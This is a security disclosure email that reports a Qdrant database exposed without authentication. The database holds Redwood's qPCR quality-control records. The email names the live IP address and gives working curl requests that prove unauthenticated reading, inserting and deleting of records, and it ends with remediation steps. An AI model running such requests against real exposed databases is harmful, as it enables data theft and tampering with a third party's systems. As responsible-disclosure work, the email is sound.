# Disclosure: Redwood qPCR Qdrant Exposure
# Status: SENT 2026-06-21
# To: investors@redwoodai.com
# From: nicholas@nuclide-research.com
# Gmail messageId: 19eea14910f51271

---
Subject: Security Issue: Redwood qPCR Qdrant Database Exposed Without Authentication

---

I am a security researcher who studies exposed AI infrastructure. I found a Qdrant vector database at 35.166.135.187 (port 80) that is publicly reachable without authentication. The data inside appears to be Redwood's qPCR curve quality control system.

WHAT I FOUND

The instance has 140 collections containing approximately 2,066,577 vectors. All collections follow the naming scheme redwood_qPCR_embeddings_v{3-7} and redwood_qPCR_embeddings_v5_test_app{N}. There is also a redwood_boundary collection containing what appear to be ML decision boundary training cases.

Each record contains: gene name, dye, instrument serial number, plate barcode, sample ID, experiment name, Ct value (cg_raw), normalization factor, replicate ID, and a quality annotation (Nominal - Good QC or Non-Nominal). The gene panel includes ERBB2, ESR1, PGR, MKI67, BIRC5, MYBL2, SCUBE2, BAG1, CCNB1, CTSL2, CD68, ACTB, GAPDH, RPLP0, GUSB, TFRC, and others. Experiment names reference QuantStudio 5 instruments (QS5-1 through QS5-5) and dates from January 2026.

I read collection metadata and a small number of payload samples to confirm what was present. I did not bulk-download the corpus.

READ ACCESS

curl http://35.166.135.187/collections
-> {"result":{"collections":[{"name":"redwood_qPCR_embeddings_v5"},{"name":"redwood_qPCR_embeddings_v6"},{"name":"redwood_boundary"},...]}}

curl -X POST http://35.166.135.187/collections/redwood_qPCR_embeddings_v5/points/scroll \
  -H 'Content-Type: application/json' -d '{"limit":1,"with_payload":true,"with_vector":false}'
-> {"result":{"points":[{"id":"...","payload":{"gene":"BIRC5","annotation":"Non-Nominal","experiment_name":"2uL Oligo_P2_QS5-2_9JAN2026_JEH","cg_raw":27,...}}]}}

WRITE AND DELETE ACCESS

curl -X PUT http://35.166.135.187/collections/redwood_qPCR_embeddings_v5/points \
  -H 'Content-Type: application/json' \
  -d '{"points":[{"id":9999999,"vector":[0,0,0,0,0,0,0,0],"payload":{"nuclide_canary":true}}]}'
-> {"result":{"operation_id":154,"status":"acknowledged"},"status":"ok"}

curl -X POST http://35.166.135.187/collections/redwood_qPCR_embeddings_v5/points/delete \
  -H 'Content-Type: application/json' -d '{"points":[9999999]}'
-> {"result":{"operation_id":155,"status":"acknowledged"},"status":"ok"}

SNAPSHOT EXPOSURE

131 of 140 collections have readable snapshot files. Each ~14.5 MB. ~1.7 GB total downloadable unauth.

ACTIVE SYSTEM

Instance started 2026-03-23. 1.5M+ health checks, 332 live ML inference queries, 1,345 writes, 110 dashboard visits via telemetry.

FIX

1. Enable Qdrant API key authentication.
2. Restrict to private network -- remove public IP exposure.
3. Add TLS.
4. If unused at this address, stop instance and close port 80 at the AWS security group.
